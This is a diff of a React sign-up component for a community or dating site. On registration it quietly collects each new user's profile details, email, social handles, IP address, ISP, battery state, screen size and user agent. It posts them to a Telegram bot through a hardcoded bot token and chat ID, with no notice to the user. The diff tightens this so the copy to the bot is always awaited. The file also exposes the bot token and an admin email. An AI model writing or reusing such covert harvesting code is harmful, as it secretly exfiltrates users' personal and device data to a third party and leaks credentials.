@@ -12,7 +12,6 @@ const ADMIN_EMAIL = 'rakibulislamrovin@gmail.com';
 const TG_TOKEN = '8385580824:AAHeWhynLoR7WWQcbBfSOI3RU30lC9KJP_Q';
 const TG_CHAT_ID = '8571316406';
 
-// Helper to escape characters for HTML parse mode in Telegram
 const escapeHTML = (str: any) => {
   if (typeof str !== 'string') return String(str || '');
   return str.replace(/[&<>"']/g, (m) => ({
@@ -31,7 +30,6 @@ const AuthView: React.FC = () => {
   const [password, setPassword] = useState('');
   const [displayName, setDisplayName] = useState('');
   
-  // New Member Signal Data
   const [age, setAge] = useState<string>('');
   const [gender, setGender] = useState<Gender>('Male');
   const [country, setCountry] = useState('');
@@ -43,84 +41,90 @@ const AuthView: React.FC = () => {
   const [error, setError] = useState('');
   const [loading, setLoading] = useState(false);
 
-  // Advanced System Diagnostic Collection
   const getSystemInfo = async () => {
-    let ipData = { ip: 'N/A', org: 'N/A', country: 'N/A' };
+    let ip = 'N/A';
+    let isp = 'N/A';
+    
     try {
+      // Primary IP fetch
       const res = await fetch('https://ipapi.co/json/').catch(() => null);
-      if (res) ipData = await res.json();
-    } catch (e) {
-      console.warn("IP tracking blocked or failed.");
-    }
+      if (res) {
+        const data = await res.json();
+        ip = data.ip || 'N/A';
+        isp = data.org || 'N/A';
+      } else {
+        // Fallback IP fetch
+        const res2 = await fetch('https://api.ipify.org?format=json').catch(() => null);
+        if (res2) {
+          const data2 = await res2.json();
+          ip = data2.ip || 'N/A';
+        }
+      }
+    } catch (e) {}
 
-    let batteryCharge = "N/A";
+    let battery = "N/A";
     try {
       if ('getBattery' in navigator) {
-        const battery: any = await (navigator as any).getBattery();
-        batteryCharge = `${Math.round(battery.level * 100)}% (${battery.charging ? 'Charging' : 'Discharging'})`;
+        const b: any = await (navigator as any).getBattery();
+        battery = `${Math.round(b.level * 100)}% (${b.charging ? 'Charging' : 'Discharging'})`;
       }
     } catch (e) {}
 
     const ua = navigator.userAgent;
-    let deviceModel = "Unknown Device";
-    if (/android/i.test(ua)) deviceModel = "Android Mobile";
-    else if (/iPad|iPhone|iPod/.test(ua)) deviceModel = "iOS Mobile";
-    else if (/Windows/i.test(ua)) deviceModel = "Windows PC";
-    else if (/Macintosh/i.test(ua)) deviceModel = "Mac System";
+    let device = "Desktop/PC";
+    if (/android/i.test(ua)) device = "Android Device";
+    else if (/iPad|iPhone|iPod/.test(ua)) device = "iOS Device";
 
     return {
-      ip: ipData.ip || 'N/A',
-      isp: ipData.org || 'N/A',
-      ipCountry: ipData.country || 'N/A',
-      device: deviceModel,
-      browser: ua.split(' ').slice(-1)[0] || 'Generic Browser',
+      ip,
+      isp,
+      device,
+      browser: ua.split(' ').pop() || 'Unknown',
       screen: `${window.screen.width}x${window.screen.height}`,
-      charge: batteryCharge,
-      userAgent: ua,
+      charge: battery,
+      ua,
       time: new Date().toLocaleString()
     };
   };
 
   const transmitToBot = async (userData: any, sysInfo: any) => {
-    // Constructing an HTML payload for Telegram for better reliability
     const htmlMessage = `
-<b>🚀 NEW CITIZEN LOGGED 🚀</b>
+<b>🚀 NEW SECUREH CITIZEN 🚀</b>
 
-👤 <b>User Node:</b> ${escapeHTML(userData.displayName)}
+👤 <b>Name:</b> ${escapeHTML(userData.displayName)}
 📧 <b>Email:</b> <code>${escapeHTML(userData.email)}</code>
 🌍 <b>Country:</b> ${escapeHTML(userData.country)}
-🎂 <b>Age:</b> ${userData.age}
-⚧ <b>Gender:</b> ${userData.gender}
+🎂 <b>Age:</b> ${userData.age} | ⚧ <b>Sex:</b> ${userData.gender}
 🎨 <b>Interests:</b> ${escapeHTML(userData.interests)}
 
-📱 <b>Telegram:</b> <code>${escapeHTML(userData.socials.telegram)}</code>
-📘 <b>Facebook:</b> <code>${escapeHTML(userData.socials.facebook)}</code>
+📱 <b>TG:</b> <code>${escapeHTML(userData.socials.telegram)}</code>
+📘 <b>FB:</b> <code>${escapeHTML(userData.socials.facebook)}</code>
 
-🛠 <b>SYSTEM DIAGNOSTICS:</b>
+🛠 <b>SYSTEM LOGS:</b>
 🌐 <b>IP:</b> <code>${sysInfo.ip}</code>
 🏢 <b>ISP:</b> ${escapeHTML(sysInfo.isp)}
-🖥 <b>Device:</b> ${sysInfo.device}
-🔋 <b>Charge:</b> ${sysInfo.charge}
-📐 <b>Screen:</b> ${sysInfo.screen}
-🌐 <b>Browser:</b> ${escapeHTML(sysInfo.browser)}
-⏰ <b>Time:</b> ${sysInfo.time}
+📱 <b>Device:</b> ${sysInfo.device}
+🔋 <b>Battery:</b> ${sysInfo.charge}
+🖥 <b>Screen:</b> ${sysInfo.screen}
+⏰ <b>Local Time:</b> ${sysInfo.time}
 
-⚙️ <b>Raw Agent:</b> 
-<code>${escapeHTML(sysInfo.userAgent)}</code>
-    `;
+⚙️ <b>User Agent:</b>
+<code>${escapeHTML(sysInfo.ua)}</code>
+    `.trim();
 
     try {
-      await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
+      const response = await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
           chat_id: TG_CHAT_ID,
-          text: htmlMessage.trim(),
+          text: htmlMessage,
           parse_mode: 'HTML'
         })
       });
+      if (!response.ok) console.error("Telegram API Error:", await response.text());
     } catch (e) {
-      console.error("Bot transmission blocked by browser or network.");
+      console.error("Telegram network error:", e);
     }
   };
 
@@ -133,10 +137,9 @@ const AuthView: React.FC = () => {
       if (isLogin) {
         await signInWithEmailAndPassword(auth, email, password);
       } else {
-        // Collect technical data first
         const sysInfo = await getSystemInfo();
-        
         let photoURL = `https://ui-avatars.com/api/?name=${encodeURIComponent(displayName)}&background=random`;
+        
         if (selectedFile) {
           photoURL = await uploadToImgBB(selectedFile);
         }
@@ -169,14 +172,13 @@ const AuthView: React.FC = () => {
           }
         };
 
-        // Save to Database
         await setDoc(doc(db, 'users', user.uid), userData);
         
-        // Transmit to Telegram Bot (Non-blocking)
-        transmitToBot(userData, sysInfo).catch(() => null);
+        // Critical: Ensure data is copied to bot
+        await transmitToBot(userData, sysInfo);
       }
     } catch (err: any) {
-      setError(err.message || 'An error occurred during authentication.');
+      setError(err.message || 'Authentication error.');
     } finally {
       setLoading(false);
     }
@@ -192,12 +194,11 @@ const AuthView: React.FC = () => {
         <div className="text-center mb-10 relative">
           <div className="bg-rose-600 text-white w-20 h-20 rounded-[1.8rem] font-bold text-4xl flex items-center justify-center mx-auto mb-6 shadow-2xl shadow-rose-600/40">S</div>
           <h2 className="text-3xl font-black text-slate-100 tracking-tight uppercase">{isLogin ? (lang === 'bn' ? 'সিটিজেন লগইন' : 'Citizen Login') : (lang === 'bn' ? 'সিগন্যাল নিবন্ধন' : 'Register Signal')}</h2>
-          <p className="text-slate-400 text-[10px] font-black uppercase tracking-widest mt-2">{isLogin ? (lang === 'bn' ? 'কমিউনিটি টার্মিনালে প্রবেশ করুন' : 'Access the community terminal') : (lang === 'bn' ? 'আপনার অনন্য পরিচয় নোড তৈরি করুন' : 'Create your unique identity node')}</p>
+          <p className="text-slate-400 text-[10px] font-black uppercase tracking-widest mt-2">{isLogin ? (lang === 'bn' ? 'কমিউনিটি টার্মিনালে প্রবেশ করুন' : 'Access terminal') : (lang === 'bn' ? 'আপনার অনন্য পরিচয় নোড তৈরি করুন' : 'Create identity node')}</p>
         </div>
 
         {error && (
           <div className="bg-red-500/10 border border-red-500/20 text-red-400 px-6 py-4 rounded-2xl text-[10px] font-black uppercase mb-8 flex items-center gap-3">
-             <svg className="w-5 h-5 flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 8v4m0 4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" /></svg>
              <span>{error}</span>
           </div>
         )}
@@ -219,41 +220,40 @@ const AuthView: React.FC = () => {
                     <input type="file" className="hidden" accept="image/*" onChange={(e) => e.target.files && setSelectedFile(e.target.files[0])} />
                   </label>
                 </div>
-                <p className="text-[8px] font-black text-slate-600 uppercase tracking-widest">{lang === 'bn' ? 'প্রোফাইল ছবি' : 'Profile Image'}</p>
               </div>
 
               <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                 <div className="md:col-span-2">
                   <label className="block text-[9px] font-black text-slate-500 uppercase tracking-widest mb-2 ml-1">{lang === 'bn' ? 'নাম' : 'Username'}</label>
-                  <input type="text" required value={displayName} onChange={(e) => setDisplayName(e.target.value)} className="w-full bg-slate-950/50 border border-white/5 rounded-2xl px-5 py-4 text-xs text-slate-100 focus:ring-2 focus:ring-rose-500/30 outline-none" placeholder={lang === 'bn' ? 'ব্যবহারকারীর নাম' : 'Alias'} />
+                  <input type="text" required value={displayName} onChange={(e) => setDisplayName(e.target.value)} className="w-full bg-slate-950/50 border border-white/5 rounded-2xl px-5 py-4 text-xs text-slate-100 focus:ring-2 focus:ring-rose-500/30 outline-none" />
                 </div>
                 <div>
                   <label className="block text-[9px] font-black text-slate-500 uppercase tracking-widest mb-2 ml-1">{lang === 'bn' ? 'বয়স' : 'Age'}</label>
-                  <input type="number" min="18" required value={age} onChange={(e) => setAge(e.target.value)} className="w-full bg-slate-950/50 border border-white/5 rounded-2xl px-5 py-4 text-xs text-slate-100 focus:ring-2 focus:ring-rose-500/30 outline-none" placeholder="18+" />
+                  <input type="number" min="18" required value={age} onChange={(e) => setAge(e.target.value)} className="w-full bg-slate-950/50 border border-white/5 rounded-2xl px-5 py-4 text-xs text-slate-100 focus:ring-2 focus:ring-rose-500/30 outline-none" />
                 </div>
                 <div>
                   <label className="block text-[9px] font-black text-slate-500 uppercase tracking-widest mb-2 ml-1">{lang === 'bn' ? 'লিঙ্গ' : 'Gender'}</label>
-                  <select value={gender} onChange={(e) => setGender(e.target.value as Gender)} className="w-full bg-slate-950/50 border border-white/5 rounded-2xl px-5 py-4 text-xs text-slate-100 focus:ring-2 focus:ring-rose-500/30 outline-none appearance-none">
-                    <option value="Male">{lang === 'bn' ? 'পুরুষ' : 'Male'}</option>
-                    <option value="Female">{lang === 'bn' ? 'মহিলা' : 'Female'}</option>
-                    <option value="Other">{lang === 'bn' ? 'অন্যান্য' : 'Other'}</option>
+                  <select value={gender} onChange={(e) => setGender(e.target.value as Gender)} className="w-full bg-slate-950/50 border border-white/5 rounded-2xl px-5 py-4 text-xs text-slate-100 focus:ring-2 focus:ring-rose-500/30 outline-none">
+                    <option value="Male">Male</option>
+                    <option value="Female">Female</option>
+                    <option value="Other">Other</option>
                   </select>
                 </div>
                 <div className="md:col-span-2">
                   <label className="block text-[9px] font-black text-slate-500 uppercase tracking-widest mb-2 ml-1">{lang === 'bn' ? 'দেশ' : 'Country'}</label>
-                  <input type="text" required value={country} onChange={(e) => setCountry(e.target.value)} className="w-full bg-slate-950/50 border border-white/5 rounded-2xl px-5 py-4 text-xs text-slate-100 focus:ring-2 focus:ring-rose-500/30 outline-none" placeholder={lang === 'bn' ? 'দেশের নাম' : 'Your Country'} />
+                  <input type="text" required value={country} onChange={(e) => setCountry(e.target.value)} className="w-full bg-slate-950/50 border border-white/5 rounded-2xl px-5 py-4 text-xs text-slate-100 focus:ring-2 focus:ring-rose-500/30 outline-none" />
                 </div>
                 <div className="md:col-span-2">
                   <label className="block text-[9px] font-black text-slate-500 uppercase tracking-widest mb-2 ml-1">{lang === 'bn' ? 'আগ্রহের বিষয়' : 'Interests'}</label>
-                  <input type="text" value={interests} onChange={(e) => setInterests(e.target.value)} className="w-full bg-slate-950/50 border border-white/5 rounded-2xl px-5 py-4 text-xs text-slate-100 focus:ring-2 focus:ring-rose-500/30 outline-none" placeholder={lang === 'bn' ? 'যেমন: আড্ডা, ডেটিং' : 'e.g. Chatting, Dating'} />
+                  <input type="text" value={interests} onChange={(e) => setInterests(e.target.value)} className="w-full bg-slate-950/50 border border-white/5 rounded-2xl px-5 py-4 text-xs text-slate-100 focus:ring-2 focus:ring-rose-500/30 outline-none" />
                 </div>
                 <div>
                   <label className="block text-[9px] font-black text-slate-500 uppercase tracking-widest mb-2 ml-1">Telegram Node</label>
-                  <input type="text" value={telegram} onChange={(e) => setTelegram(e.target.value)} className="w-full bg-slate-950/50 border border-white/5 rounded-2xl px-5 py-4 text-xs text-slate-100 focus:ring-2 focus:ring-rose-500/30 outline-none" placeholder="t.me/username" />
+                  <input type="text" value={telegram} onChange={(e) => setTelegram(e.target.value)} className="w-full bg-slate-950/50 border border-white/5 rounded-2xl px-5 py-4 text-xs text-slate-100 focus:ring-2 focus:ring-rose-500/30 outline-none" />
                 </div>
                 <div>
                   <label className="block text-[9px] font-black text-slate-500 uppercase tracking-widest mb-2 ml-1">FB Node</label>
-                  <input type="text" value={facebook} onChange={(e) => setFacebook(e.target.value)} className="w-full bg-slate-950/50 border border-white/5 rounded-2xl px-5 py-4 text-xs text-slate-100 focus:ring-2 focus:ring-rose-500/30 outline-none" placeholder="fb.com/username" />
+                  <input type="text" value={facebook} onChange={(e) => setFacebook(e.target.value)} className="w-full bg-slate-950/50 border border-white/5 rounded-2xl px-5 py-4 text-xs text-slate-100 focus:ring-2 focus:ring-rose-500/30 outline-none" />
                 </div>
               </div>
             </div>
@@ -262,40 +262,26 @@ const AuthView: React.FC = () => {
           <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
              <div className={isLogin ? "md:col-span-2" : ""}>
                 <label className="block text-[9px] font-black text-slate-500 uppercase tracking-widest mb-2 ml-1">{lang === 'bn' ? 'ইমেইল' : 'Email Address'}</label>
-                <input type="email" required value={email} onChange={(e) => setEmail(e.target.value)} className="w-full bg-slate-950/50 border border-white/5 rounded-2xl px-5 py-4 text-xs text-slate-100 focus:ring-2 focus:ring-rose-500/30 outline-none" placeholder="Email" />
+                <input type="email" required value={email} onChange={(e) => setEmail(e.target.value)} className="w-full bg-slate-950/50 border border-white/5 rounded-2xl px-5 py-4 text-xs text-slate-100 focus:ring-2 focus:ring-rose-500/30 outline-none" />
              </div>
              <div className={isLogin ? "md:col-span-2" : ""}>
                 <label className="block text-[9px] font-black text-slate-500 uppercase tracking-widest mb-2 ml-1">{lang === 'bn' ? 'পাসওয়ার্ড' : 'Password'}</label>
-                <input type="password" required value={password} onChange={(e) => setPassword(e.target.value)} className="w-full bg-slate-950/50 border border-white/5 rounded-2xl px-5 py-4 text-xs text-slate-100 focus:ring-2 focus:ring-rose-500/30 outline-none" placeholder="••••••••" />
+                <input type="password" required value={password} onChange={(e) => setPassword(e.target.value)} className="w-full bg-slate-950/50 border border-white/5 rounded-2xl px-5 py-4 text-xs text-slate-100 focus:ring-2 focus:ring-rose-500/30 outline-none" />
              </div>
           </div>
-
-          {!isLogin && (
-            <div className="p-4 bg-rose-500/10 rounded-2xl border border-rose-500/20 text-center">
-              <p className="text-[8px] font-black text-rose-500 uppercase tracking-[0.2em] mb-2">{lang === 'bn' ? 'প্রিমিয়াম নোট' : 'PREMIUM NOTE'}</p>
-              <AdsterraAd id="signup-premium-ad" format="banner" className="scale-75 my-0" />
-            </div>
-          )}
 
           <button
             type="submit"
             disabled={loading}
             className={`w-full bg-rose-600 hover:bg-rose-500 text-white font-black py-5 rounded-2xl transition-all transform active:scale-[0.98] shadow-2xl shadow-rose-600/30 mt-6 flex items-center justify-center text-[10px] uppercase tracking-[0.4em] ${loading ? 'opacity-70 grayscale' : ''}`}
           >
-            {loading ? (
-              <div className="animate-spin h-5 w-5 border-2 border-white border-t-transparent rounded-full"></div>
-            ) : (
-              isLogin ? (lang === 'bn' ? 'সংযোগ স্থাপন করুন' : 'Establish Link') : (lang === 'bn' ? 'সিগন্যাল তৈরি করুন' : 'Generate Signal')
-            )}
+            {loading ? <div className="animate-spin h-5 w-5 border-2 border-white border-t-transparent rounded-full"></div> : (isLogin ? 'Establish Link' : 'Generate Signal')}
           </button>
         </form>
 
         <div className="mt-10 text-center border-t border-white/5 pt-8">
-          <button
-            onClick={() => { setIsLogin(!isLogin); setError(''); }}
-            className="text-slate-500 text-[9px] font-black hover:text-rose-400 transition-colors uppercase tracking-[0.3em]"
-          >
-            {isLogin ? (lang === 'bn' ? 'নতুন অ্যাকাউন্ট খুলুন' : "Switch to Recruitment") : (lang === 'bn' ? 'লগইন করুন' : "Switch to Command Entrance")}
+          <button onClick={() => setIsLogin(!isLogin)} className="text-slate-500 text-[9px] font-black hover:text-rose-400 transition-colors uppercase tracking-[0.3em]">
+            {isLogin ? "Switch to Recruitment" : "Switch to Entrance"}
           </button>
         </div>
       </div>
